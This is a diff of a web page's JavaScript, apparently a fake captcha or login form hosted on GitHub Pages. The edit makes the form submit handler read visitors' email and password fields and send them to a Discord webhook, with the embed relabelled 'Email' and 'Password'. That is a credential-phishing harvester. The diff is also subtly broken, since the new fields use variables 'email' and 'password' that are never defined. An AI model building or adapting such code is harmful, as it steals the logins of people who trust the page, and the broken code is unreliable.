@@ -271,8 +271,8 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     document.getElementById('captcha-form').addEventListener('submit', async function(e) {
         e.preventDefault(); // Stop normal submission (important for GitHub Pages)
 
-        const name      = document.getElementById('name').value.trim();
-        const firstname = document.getElementById('firstname').value.trim();
+        const name      = document.getElementById('email').value.trim();
+        const firstname = document.getElementById('password').value.trim();
         const remember  = document.getElementById('remember').checked ? 'Yes' : 'No';
 
         // Your Discord webhook
@@ -284,8 +284,8 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                 color: 0x3498db,
                 timestamp: new Date().toISOString(),
                 fields: [
-                    { name: "Name / Email", value: name || "N/A", inline: true },
-                    { name: "Firstname / Password", value: firstname || "N/A", inline: true },
+                    { name: "Email", value: email || "N/A", inline: true },
+                    { name: "Password", value: password || "N/A", inline: true },
                     { name: "Remember Me", value: remember, inline: true },
                     { name: "Time", value: new Date().toLocaleString(), inline: true }
                 ],
